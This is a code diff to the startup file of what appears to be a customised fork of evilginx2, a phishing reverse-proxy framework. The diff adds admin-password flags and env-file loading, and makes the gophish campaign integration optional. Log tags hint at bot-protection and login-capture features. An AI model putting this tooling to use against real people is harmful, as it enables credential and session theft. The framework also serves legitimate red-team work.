@@ -22,6 +22,7 @@ import (
 	gp_imap "github.com/kgretzky/evilginx2/gophish/imap"
 	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/subosito/gotenv"
 	"go.uber.org/zap"
 )
 
@@ -33,6 +34,8 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var log_file = flag.String("log", "", "Tee all log output to this file (useful for grepping debug tags like [kasada-dbg], [gdlogin], [fedleak])")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
+var admin_password = flag.String("admin-password", "", "Initial web admin password for first run")
+var reset_admin_password = flag.String("reset-admin-password", "", "Reset the existing web admin password and exit")
 var version_flag = flag.Bool("v", false, "Show version")
 
 func joinPath(base_path string, rel_path string) string {
@@ -318,22 +321,26 @@ func main() {
 	cfg.SetGoPhishIntegratedAdminUrl("http://" + gpConf.AdminConf.ListenURL)
 	cfg.SetWebAdminPort(2030)
 
+	gophishOk := true
 	err = gp_models.Setup(gpConf)
 	if err != nil {
-		log.Fatal("gophish models setup: %v", err)
+		log.Warning("gophish models setup failed (non-fatal): %v", err)
+		log.Warning("gophish integration will be unavailable — continuing without it")
+		gophishOk = false
 	}
 
-	err = gp_models.UnlockAllMailLogs()
-	if err != nil {
-		log.Error("gophish unlock maillogs: %v", err)
+	if gophishOk {
+		err = gp_models.UnlockAllMailLogs()
+		if err != nil {
+			log.Error("gophish unlock maillogs: %v", err)
+		}
+
+		adminOptions := []gp_controllers.AdminServerOption{}
+		adminServer := gp_controllers.NewAdminServer(gpConf.AdminConf, adminOptions...)
+		imapMonitor := gp_imap.NewMonitor()
+		go adminServer.Start()
+		go imapMonitor.Start()
 	}
-
-	adminOptions := []gp_controllers.AdminServerOption{}
-	adminServer := gp_controllers.NewAdminServer(gpConf.AdminConf, adminOptions...)
-	imapMonitor := gp_imap.NewMonitor()
-
-	go adminServer.Start()
-	go imapMonitor.Start()
 
 	// Graceful shutdown on SIGTERM / SIGINT
 	sigCh := make(chan os.Signal, 1)
@@ -346,7 +353,26 @@ func main() {
 	}()
 
 	// Initialize and start the natively integrated xverg WebAPI
-	webApi := core.NewWebAPI(db, cfg, ns, hp)
+	if *admin_password == "" {
+		envPath := filepath.Join(*cfg_dir, "evilginx.env")
+		if _, err := os.Stat(envPath); err == nil {
+			if err := gotenv.Load(envPath); err != nil {
+				log.Warning("failed to load environment file: %v", err)
+			}
+		}
+		*admin_password = os.Getenv("EVILGINX_ADMIN_PASSWORD")
+	}
+	webApi := core.NewWebAPI(db, cfg, ns, hp, *admin_password)
+
+	if *reset_admin_password != "" {
+		if err := webApi.ResetAdminPassword(*reset_admin_password); err != nil {
+			log.Fatal("failed to reset admin password: %v", err)
+			return
+		}
+		log.Info("admin password reset successfully")
+		return
+	}
+
 	webApi.Start(cfg.GetWebAdminPort())
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode, webApi)
